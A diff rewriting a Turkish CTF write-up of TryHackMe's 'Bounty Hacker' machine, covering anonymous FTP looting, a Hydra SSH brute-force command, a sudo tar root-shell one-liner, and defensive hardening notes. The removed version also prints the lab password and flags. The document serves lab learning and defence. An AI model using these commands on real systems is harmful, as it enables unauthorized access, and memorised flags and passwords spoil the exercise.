@@ -1,87 +1,57 @@
-# Bounty Hacker (TryHackMe)
+# TryHackMe: Bounty Hacker — FTP'den Root'a
 
-**Platform:** TryHackMe
-**Zorluk:** Easy
-**Konu:** FTP enumeration, Hydra brute force, tar privilege escalation
+Siber güvenlik tarafına geçiş yapan bir yazılımcıyım. Bu makine, bir FTP sunucusunda bırakılmış dosyalardan yola çıkarak SSH ile giriş yapıp root yetkisine ulaştığım bir CTF.
 
-## Saldırı Zinciri
+## Keşif Yapma
 
-### 1. Keşif — nmap
+Her zaman olduğu gibi ilk adım Nmap ile port taraması. IP'yi aldığım an taramayı başlattım ve 3 açık port buldum:
 
-```bash
-nmap -sC -sV <HEDEF_IP>
+- **21 (FTP)** — vsFTPd 3.0.5
+- **22 (SSH)** — OpenSSH 8.2p1
+- **80 (HTTP)** — Apache 2.4.41
+
+Web tarafında düz bir sayfa vardı, ilginç bir şey yoktu. Ama FTP portu dikkatimi çekti çünkü anonymous login açık olabilir bunu Nmap çıktısından görüyoruz.
+
+## FTP ile Bilgi Toplama
+
+FTP'ye anonymous olarak bağlandım ve iki dosya buldum: `task.txt` ve `locks.txt`. Bu dosyaları indirip incelediğimde task.txt içinde sunucuyu kimin deploy ettiğini gördüm kullanıcı adı **lin**. locks.txt ise bir şifre listesiydi, yani bir wordlist.
+
+Elimde bir kullanıcı adı ve bir şifre listesi var. SSH portu açık. Yapılması gereken şey belli.
+
+## Hydra ile SSH Brute Force
+
+Hydra aracını kullanarak lin kullanıcısı için SSH brute force yaptım. Wordlist olarak FTP'den indirdiğim locks.txt dosyasını verdim.
+
+```
+hydra -l lin -P locks.txt ssh://HEDEF_IP
 ```
 
-Açık portlar:
-- **21/tcp** — FTP (vsFTPd 3.0.5)
-- **22/tcp** — SSH (OpenSSH 8.2p1)
-- **80/tcp** — HTTP (Apache 2.4.41)
+Kısa sürede şifreyi buldu: `RedDr4gonSynd1cat3`. Burada önemli olan nokta şu: genel bir wordlist (rockyou.txt gibi) yerine hedeften elde ettiğim özel bir wordlist kullandım. Bu hem daha hızlı hem de daha etkili oldu.
 
-### 2. FTP — Anonymous Login
+## SSH ile Giriş ve User Flag
 
-```bash
-ftp <HEDEF_IP>
-# Kullanıcı: anonymous / Şifre: boş
+Bulduğum bilgilerle SSH üzerinden giriş yaptım. Home dizininde user.txt dosyasını bulup ilk flag'i aldım.
+
+## Yetki Yükseltme (Privilege Escalation)
+
+Sisteme girdikten sonra her zaman yaptığım ilk şey: `sudo -l`. Bu komut, kullanıcının root olarak neleri çalıştırabildiğini gösterir. Çıktıda lin kullanıcısının **tar** aracını root olarak ve şifre sormadan çalıştırabildiğini gördüm.
+
+tar aslında dosya arşivleme aracı ama bir özelliği var: `--checkpoint-action` parametresi ile belirli aralıklarla harici komut çalıştırabiliyor. Root olarak çalışan bir tar'ın başlattığı komut da root olur.
+
+GTFOBins'ten tar için privesc komutunu buldum:
+
 ```
-
-İki dosya buldum:
-- `task.txt` — sunucuyu kimin deploy ettiğini söylüyor → **lin**
-- `locks.txt` — olası şifrelerin listesi (wordlist)
-
-```bash
-get task.txt
-get locks.txt
-```
-
-### 3. Hydra — SSH Brute Force
-
-FTP'den elde ettiğim bilgilerle SSH'ı brute force:
-
-```bash
-hydra -l lin -P locks.txt ssh://<HEDEF_IP>
-```
-
-Sonuç: `lin:RedDr4gonSynd1cat3`
-
-### 4. SSH Girişi — User Flag
-
-```bash
-ssh lin@<HEDEF_IP>
-cat ~/Desktop/user.txt
-```
-
-User flag: `THM{CR1M3_SyNd1C4T3}`
-
-### 5. Privilege Escalation — tar
-
-```bash
-sudo -l
-# (root) NOPASSWD: /bin/tar
-```
-
-GTFOBins'ten tar privesc:
-
-```bash
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-Root shell! Flag:
+Root shell aldım! /root dizinindeki root.txt dosyasından son flag'i de aldım.
 
-```bash
-cat /root/root.txt
-```
+## Kapanış ve Geliştirici Gözünden
 
-Root flag: `THM{80UN7Y_h4cK3r}`
+Bu makinede FTP'de bırakılmış dosyalardan yola çıkarak SSH brute force ile giriş yapıp, yanlış yapılandırılmış bir sudo izni üzerinden root yetkisine ulaştım.
 
-## Öğrendiğim Şeyler
+Bir yazılımcı olarak bu açıkların nasıl önlenebileceğine bakmak istiyorum:
 
-1. **FTP anonymous login** her zaman kontrol edilmeli — sızan dosyalar asıl saldırıyı başlatıyor.
-2. **Hydra** ile brute force yaparken, hedeften elde edilen wordlist (`locks.txt`) genel wordlist'ten çok daha etkili.
-3. **`sudo -l`** shell alınca ilk refleks olmalı — tar gibi masum görünen araçlar bile root shell verebilir.
-4. **GTFOBins** vazgeçilmez: `tar --checkpoint-action` ile komut çalıştırma, normal kullanımda akla gelmeyen bir özellik.
-
-## Geliştirici Notu
-
-- FTP anonymous erişimi kapatılmalı veya hassas dosyalar FTP dizininde tutulmamalı.
-- SSH brute force'a karşı: fail2ban, rate limiting, key-based auth.
-- `sudo` yetkisi verilirken GTFOBins kontrol edilmeli — tar gibi araçlar shell spawn edebilir.
+- **FTP Anonymous Erişim:** FTP'de anonymous login açık bırakılmış ve hassas dosyalar (kullanıcı adı, şifre listesi) herkesin erişimine sunulmuş. Anonymous erişim kapatılmalı veya en azından hassas dosyalar FTP dizininde tutulmamalı.
+- **SSH Brute Force:** Şifre tabanlı SSH girişine karşı fail2ban gibi araçlarla rate limiting uygulanmalı. Daha iyisi, key-based authentication kullanılmalı.
+- **Sudo Yanlış Yapılandırması:** tar gibi araçlara sudo yetkisi verilmeden önce GTFOBins kontrol edilmeli. İçinden komut çalıştırılabilen araçlara sudo izni verilmesi, doğrudan root shell demek.
